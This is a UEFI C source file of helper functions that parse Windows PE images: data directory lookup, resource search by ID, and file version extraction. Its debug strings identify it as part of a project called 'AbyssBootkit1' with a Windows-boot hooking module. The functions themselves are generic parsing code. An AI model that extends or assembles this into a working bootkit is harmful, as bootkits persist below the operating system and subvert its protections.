// --------------------------------------------------------------------------------------------------------------------------------------------
// --------------------------------------------------------------------------------------------------------------------------------------------



/**
	@file

	Utils Portable Executable
**/



// START -> LIBRARIES -------------------------------------------------------------------------------------------------------------------------
// START -> LIBRARIES -------------------------------------------------------------------------------------------------------------------------



// https://github.com/tianocore/edk2/blob/master/MdePkg/Include/Uefi.h
// Root include file for Mde Package UEFI, UEFI_APPLICATION type modules. This is the include file for any module of type UEFI and UEFI_APPLICATION. Uefi modules only use types defined via this include file and can be ported easily to any environment.
#include <Uefi.h>

// https://github.com/tianocore/edk2/blob/master/MdePkg/Include/Library/UefiLib.h
// Provides library functions for common UEFI operations. Only available to DXE and UEFI module types. The UEFI Library provides functions and macros that simplify the development of UEFI Drivers and UEFI Applications. These functions and macros help manage EFI events, build simple locks utilizing EFI Task Priority Levels (TPLs), install EFI Driver Model related protocols, manage Unicode string tables for UEFI Drivers, and print messages on the console output and standard error devices.
#include <Library/UefiLib.h>



// START -> LOCAL -----------------------------------------------------------------------------------------------------------------------------
// START -> LOCAL -----------------------------------------------------------------------------------------------------------------------------



#include <Modules/Module0_PreBoot0_Configuration/Functions/Utils/Utils00Debug.h>
#include <Modules/Module1_BootWindows0_Hookings/Functions/Utils/Utils00Debug.h>
#include <Modules/Module1_BootWindows0_Hookings/Functions/Utils/Utils04Headers.h>
#include <Modules/Module1_BootWindows0_Hookings/Functions/Utils/Utils06Address.h>



// START -> STRUCTURES ------------------------------------------------------------------------------------------------------------------------
// START -> STRUCTURES ------------------------------------------------------------------------------------------------------------------------



#include <Modules/Module1_BootWindows0_Hookings/Structures/Structures01PortableExecutable.h>



// START -> FUNCTIONS -------------------------------------------------------------------------------------------------------------------------
// START -> FUNCTIONS -------------------------------------------------------------------------------------------------------------------------



/**
	@brief          Locates and returns a pointer to a specific directory entry in the data directories of a PE image.
	@details        This function is used to retrieve information from a PE image's data directories by specifying the desired directory entry.


	@param[in]      Base                        The base address of the PE image.
	@param[in]      MappedAsImage               Indicates whether the PE file is mapped as an image.
	@param[in]      DirectoryEntry              The index of the directory entry to locate.
	@param[out]     Size                        A pointer to store the size of the located directory entry.


	@retval         VOID*                       A pointer to the located data entry if found, or NULL if not found or if an error occurs.
**/
VOID*
BootWindowsHookings_UtilsPortableExecutable_RtlpImageDirectoryEntryToDataEx(
	IN              CONST VOID*                 Base,
	IN              BOOLEAN                     MappedAsImage,
	IN              UINT16                      DirectoryEntry,
	OUT             UINT32                      *Size
)
{
	// ---------------------------------------------------------------------------------------------------------------------
	// Hello
	//PreBootConfiguration_UtilsDebug_DuringBootAndRuntimeAndHookingDebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"[INFO] AbyssBootkit1 -> BootWindowsHookings [Utils/PortableExecutable.c] (RtlpImageDirectoryEntryToDataEx) - Hello\r\n");


	// ---------------------------------------------------------------------------------------------------------------------
	// If base address points to data file adjust base and mapped flag
	//PreBootConfiguration_UtilsDebug_DuringBootAndRuntimeAndHookingDebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"[INFO] AbyssBootkit1 -> BootWindowsHookings [Utils/PortableExecutable.c] (RtlpImageDirectoryEntryToDataEx) - If base address points to data file adjust base and mapped flag\r\n");

	if (LDR_IS_DATAFILE(Base))
	{
		Base = LDR_DATAFILE_TO_VIEW(Base);
		MappedAsImage = FALSE;
	}


	// ---------------------------------------------------------------------------------------------------------------------
	// Get NT Headers
	//PreBootConfiguration_UtilsDebug_DuringBootAndRuntimeAndHookingDebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"[INFO] AbyssBootkit1 -> BootWindowsHookings [Utils/PortableExecutable.c] (RtlpImageDirectoryEntryToDataEx) - Get NT Headers\r\n");

	CONST PEFI_IMAGE_NT_HEADERS NtHeaders = BootWindowsHookings_UtilsHeaders_GetNTHeadersPEFile(Base, 0);

	// Failed
	if (NtHeaders == NULL)
	{
		//PreBootConfiguration_UtilsDebug_DuringBootAndRuntimeAndHookingDebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELERROR, L"[ERROR] AbyssBootkit1 -> BootWindowsHookings [Utils/PortableExecutable.c] (RtlpImageDirectoryEntryToDataEx) - BootWindowsHookings_UtilsHeaders_GetNTHeadersPEFile failed.\r\n");

		return NULL;
	}


	// ---------------------------------------------------------------------------------------------------------------------
	// Check if specified directory entry is not valid
	//PreBootConfiguration_UtilsDebug_DuringBootAndRuntimeAndHookingDebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"[INFO] AbyssBootkit1 -> BootWindowsHookings [Utils/PortableExecutable.c] (RtlpImageDirectoryEntryToDataEx) - Check if specified directory entry is not valid\r\n");

	if (DirectoryEntry >= HEADER_FIELD(NtHeaders, NumberOfRvaAndSizes))
	{
		//PreBootConfiguration_UtilsDebug_DuringBootAndRuntimeAndHookingDebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELERROR, L"[ERROR] AbyssBootkit1 -> BootWindowsHookings [Utils/PortableExecutable.c] (RtlpImageDirectoryEntryToDataEx) - Check [Check if specified directory entry is not valid].\r\n");

		return NULL;
	}


	// ---------------------------------------------------------------------------------------------------------------------
	// Get data directories from NT headers
	//PreBootConfiguration_UtilsDebug_DuringBootAndRuntimeAndHookingDebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"[INFO] AbyssBootkit1 -> BootWindowsHookings [Utils/PortableExecutable.c] (RtlpImageDirectoryEntryToDataEx) - Get data directories from NT headers\r\n");

	CONST PEFI_IMAGE_DATA_DIRECTORY Directories = HEADER_FIELD(NtHeaders, DataDirectory);


	// ---------------------------------------------------------------------------------------------------------------------
	// Get Relative Virtual Address (RVA) of data entry
	//PreBootConfiguration_UtilsDebug_DuringBootAndRuntimeAndHookingDebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"[INFO] AbyssBootkit1 -> BootWindowsHookings [Utils/PortableExecutable.c] (RtlpImageDirectoryEntryToDataEx) - Get Relative Virtual Address (RVA) of data entry\r\n");

	CONST UINT32 Rva = Directories[DirectoryEntry].VirtualAddress;

	// Failed
	if (Rva == 0)
	{
		//PreBootConfiguration_UtilsDebug_DuringBootAndRuntimeAndHookingDebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELERROR, L"[ERROR] AbyssBootkit1 -> BootWindowsHookings [Utils/PortableExecutable.c] (RtlpImageDirectoryEntryToDataEx) - Operation failed: Rva is equals to zero.\r\n");

		return NULL;
	}


	// ---------------------------------------------------------------------------------------------------------------------
	// Calculate size of data entry
	//PreBootConfiguration_UtilsDebug_DuringBootAndRuntimeAndHookingDebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"[INFO] AbyssBootkit1 -> BootWindowsHookings [Utils/PortableExecutable.c] (RtlpImageDirectoryEntryToDataEx) - Calculate size of data entry\r\n");

	*Size = Directories[DirectoryEntry].Size;


	// ---------------------------------------------------------------------------------------------------------------------
	// Bye
	//PreBootConfiguration_UtilsDebug_DuringBootAndRuntimeAndHookingDebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"[INFO] AbyssBootkit1 -> BootWindowsHookings [Utils/PortableExecutable.c] (RtlpImageDirectoryEntryToDataEx) - Bye\r\n");


	// ---------------------------------------------------------------------------------------------------------------------
	// PE file is mapped as an image or RVA is within headers
	//PreBootConfiguration_UtilsDebug_DuringBootAndRuntimeAndHookingDebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"[INFO] AbyssBootkit1 -> BootWindowsHookings [Utils/PortableExecutable.c] (RtlpImageDirectoryEntryToDataEx) - PE file is mapped as an image or RVA is within headers\r\n");

	if (MappedAsImage || Rva < HEADER_FIELD(NtHeaders, SizeOfHeaders))
	{
		// Return pointer
		return (UINT8*)(Base) + Rva;
	}


	// ---------------------------------------------------------------------------------------------------------------------
	// Calculate offset to data entry and return the pointer
	//PreBootConfiguration_UtilsDebug_DuringBootAndRuntimeAndHookingDebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"[INFO] AbyssBootkit1 -> BootWindowsHookings [Utils/PortableExecutable.c] (RtlpImageDirectoryEntryToDataEx) - Calculate offset to data entry and return the pointer\r\n");

	return (UINT8*)(Base) + BootWindowsHookings_UtilsAddress_RelativeVirtualAddressToOffset(NtHeaders, Rva);
}



/**
	@brief         Searches for resource data within a Portable Executable (PE) file
	@details       This function search for and extract resource data, from a PE (Portable Executable) image using specified resource identifiers. Resource data is organized into directories and subdirectories within the image, and this function navigates through these structures to locate and return the requested resource.


	@param[in]      ImageBase                   A pointer to the base address of the PE image to search.
	@param[in]      TypeId                      The TypeId identifying the resource type.
	@param[in]      NameId                      The NameId identifying the resource name.
	@param[in]      LanguageId                  (Optional) The LanguageId identifying the resource language. If not provided or set to 0, the function retrieves the first matching resource regardless of language.
	@param[out]     ResourceData                (Optional) A pointer to a pointer that receives the address of the located resource data within the image. If not provided (NULL), the resource data is not returned.
	@param[out]     ResourceSize                A pointer to a UINT32 variable that receives the size, in bytes, of the located resource data.


	@retval         EFI_SUCCESS                 The resource data is successfully located, and ResourceData (if provided) and ResourceSize are populated.
	@retval         EFI_NOT_FOUND               The specified resource or resource type is not found in the PE image.
	@retval         EFI_INVALID_LANGUAGE        If LanguageId is specified, but no matching resource with the specified language is found.
**/
EFI_STATUS
BootWindowsHookings_UtilsPortableExecutable_FindResourceDataById(
	IN              CONST VOID*                 ImageBase,
	IN              UINT16                      TypeId,
	IN              UINT16                      NameId,
	IN              UINT16                      LanguageId OPTIONAL,
	OUT             VOID**                      ResourceData OPTIONAL,
	OUT             UINT32*                     ResourceSize
)
{
	// ---------------------------------------------------------------------------------------------------------------------
	// Hello
	//PreBootConfiguration_UtilsDebug_DuringBootAndRuntimeAndHookingDebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"[INFO] AbyssBootkit1 -> BootWindowsHookings [Utils/PortableExecutable.c] (FindResourceDataById) - Hello\r\n");


	// ---------------------------------------------------------------------------------------------------------------------
	// Variables
	if (ResourceData != NULL)
	{
		*ResourceData = NULL;
	}
	*ResourceSize = 0;
	UINT32 Size = 0;


	// ---------------------------------------------------------------------------------------------------------------------
	// Get resource directory
	//PreBootConfiguration_UtilsDebug_DuringBootAndRuntimeAndHookingDebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"[INFO] AbyssBootkit1 -> BootWindowsHookings [Utils/PortableExecutable.c] (FindResourceDataById) - Get resource directory\r\n");

	EFI_IMAGE_RESOURCE_DIRECTORY *ResourceDirTable = BootWindowsHookings_UtilsPortableExecutable_RtlpImageDirectoryEntryToDataEx(ImageBase, TRUE, EFI_IMAGE_DIRECTORY_ENTRY_RESOURCE, &Size);

	// Failed
	if (ResourceDirTable == NULL || Size == 0)
	{
		//PreBootConfiguration_UtilsDebug_DuringBootAndRuntimeAndHookingDebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELERROR, L"[ERROR] AbyssBootkit1 -> BootWindowsHookings [Utils/PortableExecutable.c] (FindResourceDataById) - BootWindowsHookings_UtilsPortableExecutable_RtlpImageDirectoryEntryToDataEx failed.\r\n");

		return EFI_NOT_FOUND;
	}


	// ---------------------------------------------------------------------------------------------------------------------
	// Iterate through resource directory entries
	//PreBootConfiguration_UtilsDebug_DuringBootAndRuntimeAndHookingDebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"[INFO] AbyssBootkit1 -> BootWindowsHookings [Utils/PortableExecutable.c] (FindResourceDataById) - Iterate through resource directory entries\r\n");

	CONST UINT8* ResourceDirVa = (UINT8*)ResourceDirTable;
	EFI_IMAGE_RESOURCE_DIRECTORY_ENTRY *DirEntry = NULL;
	for (UINT16 i = ResourceDirTable->NumberOfNamedEntries; i < ResourceDirTable->NumberOfNamedEntries + ResourceDirTable->NumberOfIdEntries; ++i)
	{
		// Get current directory entry
		DirEntry = (EFI_IMAGE_RESOURCE_DIRECTORY_ENTRY*)((UINT8*)ResourceDirTable + sizeof(EFI_IMAGE_RESOURCE_DIRECTORY) + (i * sizeof(EFI_IMAGE_RESOURCE_DIRECTORY_ENTRY)));
		if ((BOOLEAN)DirEntry->u1.s.NameIsString)
		{
			continue;
		}
		// Directory entry matches TypeId
		if (DirEntry->u1.Id == TypeId && DirEntry->u2.s.DataIsDirectory)
		{
			//PreBootConfiguration_UtilsDebug_DuringBootAndRuntimeAndHookingDebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"[INFO] AbyssBootkit1 -> BootWindowsHookings [Utils/PortableExecutable.c] (FindResourceDataById) - Directory entry matches TypeId\r\n");
			break;
		}
	}

	// No matching TypeId
	if (DirEntry == NULL || DirEntry->u1.Id != TypeId)
	{
		//PreBootConfiguration_UtilsDebug_DuringBootAndRuntimeAndHookingDebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELERROR, L"[ERROR] AbyssBootkit1 -> BootWindowsHookings [Utils/PortableExecutable.c] (FindResourceDataById) - Operation failed: No matching TypeId.\r\n");

		return EFI_NOT_FOUND;
	}


	// ---------------------------------------------------------------------------------------------------------------------
	// Update resource directory
	//PreBootConfiguration_UtilsDebug_DuringBootAndRuntimeAndHookingDebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"[INFO] AbyssBootkit1 -> BootWindowsHookings [Utils/PortableExecutable.c] (FindResourceDataById) - Update resource directory\r\n");

	ResourceDirTable = (EFI_IMAGE_RESOURCE_DIRECTORY*)(ResourceDirVa + DirEntry->u2.s.OffsetToDirectory);


	// ---------------------------------------------------------------------------------------------------------------------
	// Iterate through resource directory entries
	//PreBootConfiguration_UtilsDebug_DuringBootAndRuntimeAndHookingDebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"[INFO] AbyssBootkit1 -> BootWindowsHookings [Utils/PortableExecutable.c] (FindResourceDataById) - Iterate through resource directory entries\r\n");

	DirEntry = NULL;
	for (UINT16 i = ResourceDirTable->NumberOfNamedEntries; i < ResourceDirTable->NumberOfNamedEntries + ResourceDirTable->NumberOfIdEntries; ++i)
	{
		// Get current directory entry
		DirEntry = (EFI_IMAGE_RESOURCE_DIRECTORY_ENTRY*)((UINT8*)ResourceDirTable + sizeof(EFI_IMAGE_RESOURCE_DIRECTORY) + (i * sizeof(EFI_IMAGE_RESOURCE_DIRECTORY_ENTRY)));
		if ((BOOLEAN)DirEntry->u1.s.NameIsString)
		{
			continue;
		}
		// Directory entry matches Name
		if (DirEntry->u1.Id == NameId && DirEntry->u2.s.DataIsDirectory)
		{
			//PreBootConfiguration_UtilsDebug_DuringBootAndRuntimeAndHookingDebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"[INFO] AbyssBootkit1 -> BootWindowsHookings [Utils/PortableExecutable.c] (FindResourceDataById) - Directory entry matches Name\r\n");
			break;
		}
	}

	// No matching Name
	if (DirEntry == NULL || DirEntry->u1.Id != NameId)
	{
		//PreBootConfiguration_UtilsDebug_DuringBootAndRuntimeAndHookingDebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELERROR, L"[ERROR] AbyssBootkit1 -> BootWindowsHookings [Utils/PortableExecutable.c] (FindResourceDataById) - Operation failed: No matching Name.\r\n");

		return EFI_NOT_FOUND;
	}


	// ---------------------------------------------------------------------------------------------------------------------
	// Update resource directory
	//PreBootConfiguration_UtilsDebug_DuringBootAndRuntimeAndHookingDebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"[INFO] AbyssBootkit1 -> BootWindowsHookings [Utils/PortableExecutable.c] (FindResourceDataById) - Update resource directory\r\n");

	ResourceDirTable = (EFI_IMAGE_RESOURCE_DIRECTORY*)(ResourceDirVa + DirEntry->u2.s.OffsetToDirectory);


	// ---------------------------------------------------------------------------------------------------------------------
	// Iterate through resource directory entries
	//PreBootConfiguration_UtilsDebug_DuringBootAndRuntimeAndHookingDebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"[INFO] AbyssBootkit1 -> BootWindowsHookings [Utils/PortableExecutable.c] (FindResourceDataById) - Iterate through resource directory entries\r\n");

	DirEntry = NULL;
	for (UINT16 i = ResourceDirTable->NumberOfNamedEntries; i < ResourceDirTable->NumberOfNamedEntries + ResourceDirTable->NumberOfIdEntries; ++i)
	{
		// Get current directory entry
		DirEntry = (EFI_IMAGE_RESOURCE_DIRECTORY_ENTRY*)((UINT8*)ResourceDirTable + sizeof(EFI_IMAGE_RESOURCE_DIRECTORY) + (i * sizeof(EFI_IMAGE_RESOURCE_DIRECTORY_ENTRY)));
		if ((BOOLEAN)DirEntry->u1.s.NameIsString)
		{
			continue;
		}
		// Directory entry matches LanguageId
		if ((LanguageId == 0 || DirEntry->u1.Id == LanguageId) && !DirEntry->u2.s.DataIsDirectory)
		{
			//PreBootConfiguration_UtilsDebug_DuringBootAndRuntimeAndHookingDebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"[INFO] AbyssBootkit1 -> BootWindowsHookings [Utils/PortableExecutable.c] (FindResourceDataById) - Directory entry matches LanguageId\r\n");
			break;
		}
	}

	// No matching LanguageId
	if (DirEntry == NULL || (LanguageId != 0 && DirEntry->u1.Id != LanguageId))
	{
		//PreBootConfiguration_UtilsDebug_DuringBootAndRuntimeAndHookingDebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELERROR, L"[ERROR] AbyssBootkit1 -> BootWindowsHookings [Utils/PortableExecutable.c] (FindResourceDataById) - Operation failed: No matching LanguageId.\r\n");

		return EFI_INVALID_LANGUAGE;
	}


	// ---------------------------------------------------------------------------------------------------------------------
	// Get resource data entry for selected resource
	//PreBootConfiguration_UtilsDebug_DuringBootAndRuntimeAndHookingDebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"[INFO] AbyssBootkit1 -> BootWindowsHookings [Utils/PortableExecutable.c] (FindResourceDataById) - Get resource data entry for selected resource\r\n");

	EFI_IMAGE_RESOURCE_DATA_ENTRY *DataEntry = (EFI_IMAGE_RESOURCE_DATA_ENTRY*)(ResourceDirVa + DirEntry->u2.OffsetToData);


	// Update ResourceData with the new addres
	//PreBootConfiguration_UtilsDebug_DuringBootAndRuntimeAndHookingDebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"[INFO] AbyssBootkit1 -> BootWindowsHookings [Utils/PortableExecutable.c] (FindResourceDataById) - Update ResourceData with the new addres\r\n");

	if (ResourceData != NULL)
	{
		*ResourceData = (VOID*)((UINT8*)ImageBase + DataEntry->OffsetToData);
	}
	*ResourceSize = DataEntry->Size;


	// ---------------------------------------------------------------------------------------------------------------------
	// Bye
	//PreBootConfiguration_UtilsDebug_DuringBootAndRuntimeAndHookingDebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"[INFO] AbyssBootkit1 -> BootWindowsHookings [Utils/PortableExecutable.c] (FindResourceDataById) - Bye\r\n");


	// ---------------------------------------------------------------------------------------------------------------------
	// Return
	return EFI_SUCCESS;
}



/**
	@brief          Get version information from a Portable Executable (PE) file.
	@details        This function extracts version information from a PE file, such as an EFI application or executable, and returns the major version, minor version, build number, revision, and file flags if available.


	@param[in]      ImageBase                   A pointer to the base address of the PE file.
	@param[out]     MajorVersion                (Optional) A pointer to store the major version.
	@param[out]     MinorVersion                (Optional) A pointer to store the minor version.
	@param[out]     BuildNumber                 (Optional) A pointer to store the build number.
	@param[out]     Revision                    (Optional) A pointer to store the revision.
	@param[out]     FileFlags                   (Optional) A pointer to store the file flags.


	@retval         EFI_SUCCESS                 The version information is successfully retrieved.
	@retval         EFI_NOT_FOUND               The version information is not found in the PE file.
	@retval         other                       An error occurred.
**/
EFI_STATUS
BootWindowsHookings_UtilsPortableExecutable_GetVersionPEFile(
	IN              CONST VOID*                 ImageBase,
	OUT             UINT16*                     MajorVersion OPTIONAL,
	OUT             UINT16*                     MinorVersion OPTIONAL,
	OUT             UINT16*                     BuildNumber OPTIONAL,
	OUT             UINT16*                     Revision OPTIONAL,
	OUT             UINT32*                     FileFlags OPTIONAL
)
{
	// ---------------------------------------------------------------------------------------------------------------------
	// Hello
	//PreBootConfiguration_UtilsDebug_DuringBootAndRuntimeAndHookingDebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"[INFO] AbyssBootkit1 -> BootWindowsHookings [Utils/PortableExecutable.c] (GetVersionPEFile) - Hello\r\n");


	// ---------------------------------------------------------------------------------------------------------------------
	// Variables
	VS_VERSIONINFO *VersionResource;
	UINT32 VersionResourceSize;


	// ---------------------------------------------------------------------------------------------------------------------
	// Search PE file resource directory
	//PreBootConfiguration_UtilsDebug_DuringBootAndRuntimeAndHookingDebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"[INFO] AbyssBootkit1 -> BootWindowsHookings [Utils/PortableExecutable.c] (GetVersionPEFile) - Search PE file resource directory\r\n");

	CONST EFI_STATUS Status = BootWindowsHookings_UtilsPortableExecutable_FindResourceDataById(ImageBase, RT_VERSION, VS_VERSION_INFO, MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL), (VOID**)&VersionResource, &VersionResourceSize);

	// Failed
	if (EFI_ERROR(Status))
	{
		//PreBootConfiguration_UtilsDebug_DuringBootAndRuntimeAndHookingDebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELERROR, L"[ERROR] AbyssBootkit1 -> BootWindowsHookings [Utils/PortableExecutable.c] (GetVersionPEFile) - BootWindowsHookings_UtilsPortableExecutable_FindResourceDataById failed.\r\n");

		return Status;
	}

	// Resource data not valid
	if (VersionResourceSize < sizeof(VS_VERSIONINFO) || StrnCmp(VersionResource->Name, L"VS_VERSION_INFO", (sizeof(L"VS_VERSION_INFO") / sizeof(CHAR16)) - 1) != 0 || VersionResource->ValueFixedFileInfo.dwSignature != 0xFEEF04BD)
	{
		//PreBootConfiguration_UtilsDebug_DuringBootAndRuntimeAndHookingDebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELERROR, L"[ERROR] AbyssBootkit1 -> BootWindowsHookings [Utils/PortableExecutable.c] (GetVersionPEFile) - Operation failed: Resource data not valid.\r\n");

		return EFI_NOT_FOUND;
	}


	// ---------------------------------------------------------------------------------------------------------------------
	// Get version information
	//PreBootConfiguration_UtilsDebug_DuringBootAndRuntimeAndHookingDebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"[INFO] AbyssBootkit1 -> BootWindowsHookings [Utils/PortableExecutable.c] (GetVersionPEFile) - Get version information\r\n");

	if (MajorVersion != NULL)
	{
		*MajorVersion = HIWORD(VersionResource->ValueFixedFileInfo.dwFileVersionMS);
	}
	if (MinorVersion != NULL)
	{
		*MinorVersion = LOWORD(VersionResource->ValueFixedFileInfo.dwFileVersionMS);
	}
	if (BuildNumber != NULL)
	{
		*BuildNumber = HIWORD(VersionResource->ValueFixedFileInfo.dwFileVersionLS);
	}
	if (Revision != NULL)
	{
		*Revision = LOWORD(VersionResource->ValueFixedFileInfo.dwFileVersionLS);
	}
	if (FileFlags != NULL)
	{
		*FileFlags = (VersionResource->ValueFixedFileInfo.dwFileFlags & VersionResource->ValueFixedFileInfo.dwFileFlagsMask);
	}


	// ---------------------------------------------------------------------------------------------------------------------
	// Bye
	//PreBootConfiguration_UtilsDebug_DuringBootAndRuntimeAndHookingDebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"[INFO] AbyssBootkit1 -> BootWindowsHookings [Utils/PortableExecutable.c] (GetVersionPEFile) - Bye\r\n");


	// ---------------------------------------------------------------------------------------------------------------------
	// Return
	return EFI_SUCCESS;
}



// --------------------------------------------------------------------------------------------------------------------------------------------
// --------------------------------------------------------------------------------------------------------------------------------------------
